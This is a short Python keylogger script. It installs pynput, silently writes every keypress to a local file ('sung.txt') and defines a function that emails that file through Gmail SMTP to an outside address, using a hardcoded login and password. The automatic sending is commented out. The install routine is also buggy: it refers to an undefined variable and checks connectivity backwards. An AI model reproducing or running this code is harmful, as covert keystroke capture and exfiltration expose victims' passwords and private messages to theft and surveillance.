import socket

def waitingforinternet():
    k,n=True,0
    while k:
        ipa=socket.gethostbyname(socket.gethostname())
        if ipa=='127.0.0.1':
            k,n=True,0
        else:
            k,n=False,1
    return (k,n)
def cinternet():
    n=0
    ipa=socket.gethostbyname(socket.gethostname())
    if ipa=='127.0.0.1':
        n=0
    else:
        n=1
    return n

               

import sys
import subprocess
import pkg_resources
def instmod():
    modd='pynput'
##    req={'pynput','smtplib'}
##    inst={pkg.key for pkg in pkg_resources.working_set}
##    sd=list(inst)
##    mod=list(req)
##    
##    for i in mod:
##    if i not in sd:
    
    if cinternet()!=1:
        waitingforinternet()
        subprocess.check_call([sys.executable, "-m", "pip", "install", i])
##    else:
##        subprocess.check_call([sys.executable, "-m", "pip", "install", i])
instmod()
        
from pynput.keyboard import Listener
import smtplib
from email.message import EmailMessage

nc=0
def send():
    m = EmailMessage()
    m["From"] = "mr.mistakie@gmail.com"
    m["Subject"] = "Subject"
    m["To"] = "stompingmajesty@gmail.com"
    m.set_content("This is the message body")
    filename="sung.txt"
    m.add_attachment(open(filename, "r").read(), filename="sung.txt")
    try:
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.ehlo()
        s.starttls()
        s.login('mr.mistakie', 'simplepass')
        s.send_message(m)
        f=open(filename, 'w')
        f.close()
    except:
        print('Authentication error')
       

def w(k):
    global nc
    nc+=1
    kd = str(k)
    kd = kd.replace("'","")
    kd = kd.replace("Key.space"," ")
    with open('sung.txt','a') as f:
        f.write(kd)

##    if nc%5==0:
##        send()

## with the current gmail's policy , it was made impossible to login from unsecure apps,
##        since then the send mail option has become invalid

with Listener(on_press=w) as l:
    l.join()
